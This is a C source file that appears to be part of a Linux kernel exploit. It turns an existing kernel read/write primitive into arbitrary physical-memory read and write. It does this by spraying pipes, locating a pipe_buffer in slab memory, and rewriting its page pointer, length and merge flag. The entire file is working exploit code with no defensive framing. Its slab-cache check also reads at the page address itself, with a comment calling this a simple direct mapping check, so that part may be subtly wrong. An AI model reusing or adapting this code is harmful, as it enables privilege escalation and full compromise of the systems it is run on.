#include "common.h"
#include "runtime_struct_offsets.h"

#define PHYSRW_SCAN_CHUNK     256
#define PHYSRW_RECLAIM_COUNT  16
#define PHYSRW_DRAIN_COUNT    64

static int pr_drain_fds[PHYSRW_DRAIN_COUNT][2];
static int pr_reclaim_fds[PHYSRW_RECLAIM_COUNT][2];
static int pr_pipes_ready;

static uintptr_t pr_buf_base;
static uintptr_t pr_buf_addr;
static int       pr_pipe_idx = -1;

int pipe_cache_gate_ok;

static uintptr_t pr_pipe_buf_ops(void) {
  return ANON_PIPE_BUF_OPS;
}

static uintptr_t pr_kmalloc_caches(void) {
  return KMALLOC_CACHES;
}

uintptr_t direct_to_page(uintptr_t addr) {
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

static void pr_prepare_pipe_buffers(void) {
  int i;
  for (i = 0; i < PHYSRW_DRAIN_COUNT; i++) {
    SYSCHK(pipe(pr_drain_fds[i]));
    SYSCHK(fcntl(pr_drain_fds[i][0], F_SETPIPE_SZ, 2 * PAGE_SIZE));
  }
  for (i = 0; i < PHYSRW_RECLAIM_COUNT; i++) {
    SYSCHK(pipe(pr_reclaim_fds[i]));
    SYSCHK(fcntl(pr_reclaim_fds[i][0], F_SETPIPE_SZ, 2 * PAGE_SIZE));
  }
  pr_pipes_ready = 1;
  for (i = 0; i < PHYSRW_DRAIN_COUNT; i++) {
    SYSCHK(fcntl(pr_drain_fds[i][0], F_SETPIPE_SZ, 32 * PAGE_SIZE));
  }
  for (i = 0; i < PHYSRW_RECLAIM_COUNT; i++) {
    SYSCHK(fcntl(pr_reclaim_fds[i][0], F_SETPIPE_SZ, 32 * PAGE_SIZE));
  }
}

static int pr_cache_gate(int fd) {
  if (!is_direct_ptr(page_base)) return 0;
  uint64_t cache_slots[64];
  memset(cache_slots, 0, sizeof(cache_slots));
  kernel_read_data(fd, pr_kmalloc_caches(), cache_slots, sizeof(cache_slots));
  uint64_t want_normal = cache_slots[0 * 16 + 11];
  uint64_t want_cgroup = cache_slots[2 * 16 + 11];
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page_va = page_base + off;
    uintptr_t head = page_va; // Simple direct mapping check
    uint64_t slab_cache = pipe_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    if (slab_cache != 0 && (slab_cache == want_normal || slab_cache == want_cgroup)) {
      pr_buf_base = page_va;
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }
  return 0;
}

static int pr_find_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  for (size_t off = 0; off < ORDER3_SIZE; off += PHYSRW_SCAN_CHUNK) {
    kernel_read_data(fd, base + off, slab + off, PHYSRW_SCAN_CHUNK);
  }
  uintptr_t expected_ops = pr_pipe_buf_ops();
  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE; off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page < VMEMMAP_START || pb.page >= VMEMMAP_END) continue;
    if (pb.offset != 0 || pb.ops != expected_ops || pb.private != 0) continue;
    if (pb.len == 0 || pb.len > (uint32_t)PHYSRW_RECLAIM_COUNT) continue;
    pr_buf_addr = base + off;
    pr_pipe_idx = (int)pb.len - 1;
    return 1;
  }
  return 0;
}

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  if (pr_buf_addr == 0 || pr_pipe_idx < 0) return 0;
  struct user_pipe_buffer saved, pb;
  kernel_read_data(fd, pr_buf_addr, &saved, sizeof(saved));
  pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  kernel_write_data(fd, pr_buf_addr, &pb, sizeof(pb));
  ssize_t got = read(pr_reclaim_fds[pr_pipe_idx][0], out, len);
  kernel_write_data(fd, pr_buf_addr, &saved, sizeof(saved));
  return got == (ssize_t)len;
}

int pipe_phys_write_data(int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pr_buf_addr == 0 || pr_pipe_idx < 0) return 0;
  struct user_pipe_buffer saved, pb;
  kernel_read_data(fd, pr_buf_addr, &saved, sizeof(saved));
  pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.flags = 0x10; // PIPE_BUF_FLAG_CAN_MERGE
  kernel_write_data(fd, pr_buf_addr, &pb, sizeof(pb));
  ssize_t wrote = write(pr_reclaim_fds[pr_pipe_idx][1], data, len);
  kernel_write_data(fd, pr_buf_addr, &saved, sizeof(saved));
  return wrote == (ssize_t)len;
}

uint64_t pipe_read64(int fd, uintptr_t addr) {
  uint64_t val = 0;
  pipe_phys_read_data(fd, addr, &val, sizeof(val));
  return val;
}

uint32_t pipe_read32(int fd, uintptr_t addr) {
  uint32_t val = 0;
  pipe_phys_read_data(fd, addr, &val, sizeof(val));
  return val;
}

int pipe_write64(int fd, uintptr_t addr, uint64_t val) {
  return pipe_phys_write_data(fd, addr, &val, sizeof(val));
}

int pipe_write32(int fd, uintptr_t addr, uint32_t val) {
  return pipe_phys_write_data(fd, addr, &val, sizeof(val));
}

int install_pipe_physrw(int fd) {
  pr_prepare_pipe_buffers();
  for (int i = 0; i < PHYSRW_RECLAIM_COUNT; i++) {
    char buf[i + 1];
    memset(buf, 0x42, sizeof(buf));
    write(pr_reclaim_fds[i][1], buf, sizeof(buf));
  }
  if (!pr_cache_gate(fd)) return 0;
  if (!pr_find_buffer(fd, pr_buf_base)) return 0;
  uint8_t test_val = 0x55, read_val = 0;
  uintptr_t test_addr = page_base + 0x1000;
  pipe_phys_write_data(fd, test_addr, &test_val, 1);
  pipe_phys_read_data(fd, test_addr, &read_val, 1);
  if (read_val == test_val) {
    physrw_read_ok = physrw_write_ok = 1;
    return 1;
  }
  return 0;
}
